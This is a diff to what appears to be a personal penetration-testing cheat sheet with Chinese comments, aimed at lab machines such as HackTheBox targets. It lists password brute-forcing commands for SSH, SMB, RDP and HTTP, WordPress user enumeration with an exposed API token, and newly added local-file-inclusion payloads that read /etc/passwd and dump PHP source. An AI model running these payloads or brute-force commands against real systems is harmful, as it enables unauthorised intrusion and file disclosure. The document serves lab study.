@@ -121,9 +121,6 @@ nslookup
 server xxx.xxx.xxx.xxx
 127.0.0.1
 
-
-
-
 ###暴力破解
 /opt/crackmapexec/poetry run crackmapexec ssh 10.129.1.145  -u ~/timmy/hackthebox/Openadmin/users.txt -p ~/timmy/hackthebox/Openadmin/passwords.txt
 /opt/crackmapexec/poetry run crackmapexec smb 10.129.48.113 -u ~/timmy/hackthebox/ServMon/users.txt -p ~/timmy/hackthebox/ServMon/passwords.txt
@@ -137,9 +134,6 @@ wpscan --url http://10.10.222.171/ --disable-tls-checks --enumerate u --api-toke
 wpscan --url http://internal.thm/blog/ --disable-tls-checks --enumerate vp --api-token yebWdQNmyXU7oApKQatIaLPe5NL0EkYTjuSunpp5DIU
 medusa -h 10.11.1.22 -u tris -P /usr/share/wordlists/rockyou.txt -M http-m DIR:/admin
 ncrack -u adam -P /usr/share/wordlists/rockyou.txt -p 3389 10.11.1.22
-
-
-
 
 
 ###ssh key 密碼破解
@@ -170,6 +164,11 @@ wfuzz -c -u http://10.129.134.249/weather/forecast?city=FUZZ  -w /usr/share/word
 
 
 
+### LFI及RFI,url後有viewresult.php?view=192.168.49.211_1626436450.txt嘗試以下
+view=../../../../../../etc/passwd
+view=../../../../etc/passwd%00
+view=php://filter/convert.base64-encode/resource=viewresult.php   ###將當下檔案轉成base64
+view=/etc/passwd
 
 ###查看緩存檔案swp
 vim -r auth.php.swp
